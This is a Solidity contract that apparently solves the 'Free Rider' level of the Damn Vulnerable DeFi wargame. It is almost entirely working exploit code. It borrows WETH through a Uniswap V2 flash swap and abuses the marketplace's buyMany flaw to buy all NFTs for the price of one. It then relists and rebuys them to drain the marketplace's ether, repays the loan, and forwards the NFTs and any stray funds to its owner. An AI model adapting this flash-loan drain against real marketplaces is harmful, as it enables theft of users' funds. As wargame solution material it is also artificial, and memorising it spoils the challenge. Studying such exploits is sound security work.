pragma solidity ^0.8.0;
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";
import "../free-rider/FreeRiderBuyer.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IWETH9{
    function withdraw(uint256 amount) external;
    function deposit() payable external;
    function transfer(address recipient, uint256 amount) external;
}
contract FreeRiderExploit is IERC721Receiver{
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace NFTMarketplace;
    IWETH9 WETH;
    DamnValuableNFT NFT;
    FreeRiderBuyer buyer;
    address owner;
    uint256[] nftIDs;
    uint256 initPrice;
    // Initialization of interfaces
    constructor(address unipair, address payable marketplace, address weth9, address nft, address buyerAddr){
        uniswapPair = IUniswapV2Pair(unipair);
        NFTMarketplace = FreeRiderNFTMarketplace(marketplace);
        WETH = IWETH9(weth9);
        NFT = DamnValuableNFT(nft);
        buyer = FreeRiderBuyer(buyerAddr);
        owner = msg.sender;
    }
    // Exploitation requires equal price for delivered NFTs
    function exploit(uint256[] calldata argNftIDs, uint256 price) external payable{
        initPrice = price;
        //Temporary store NFT Ids in storage array
        for(uint i = 0; i<argNftIDs.length; i++){
            nftIDs.push(argNftIDs[i]);
        }
        require(msg.sender == owner, "Only owner");   // Only owner
        uniswapPair.swap(initPrice, 0, address(this), 
            abi.encodeWithSignature("noExist()")); // Flash swap
        // Transfer NFTs to buyer
        for(uint i = 0; i<nftIDs.length; i++){
            NFT.safeTransferFrom(address(this), address(buyer), nftIDs[i]);
        }
        // Send back remaining ether
        payable(msg.sender).transfer(address(this).balance);
        // Clear Ids
        for(uint i = 0; i<argNftIDs.length; i++){
            nftIDs.pop();
        }
        initPrice = 0;
    }

    receive() external payable{
        //Send ETH please
        if(tx.origin != owner){
            payable(owner).transfer(address(this).balance);
        }
    }

    fallback() external payable{
        require(initPrice != 0, "Called outside exploit()");
        require(tx.origin == owner, "Only tx owner");
        // Convert WETH to ETH
        WETH.withdraw(initPrice);
        // Buy all NFT at price of one
        NFTMarketplace.buyMany{value: initPrice}(nftIDs);
        // Calculate optimal price
        uint256 newPrice = initPrice/(nftIDs.length-1);
        uint256[] memory newPrices = new uint256[](nftIDs.length);
        for(uint i = 0; i<newPrices.length; i++){
            newPrices[i] = newPrice;
            // Approve for selling
            NFT.approve(address(NFTMarketplace), nftIDs[i]);
        }
        // Resell NFTs
        NFTMarketplace.offerMany(nftIDs, newPrices);
        // Drain remaining ether
        NFTMarketplace.buyMany{value: newPrice}(nftIDs);
        // Return WETH
        WETH.deposit{value: initPrice * 10035/10000}();
        WETH.transfer(address(uniswapPair), initPrice * 10035/10000);
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {
        // Can I have free NFT? :)
        if(tx.origin != owner){
            NFT.safeTransferFrom(address(this), address(owner), _tokenId);
        }       

        return IERC721Receiver.onERC721Received.selector;
    }
}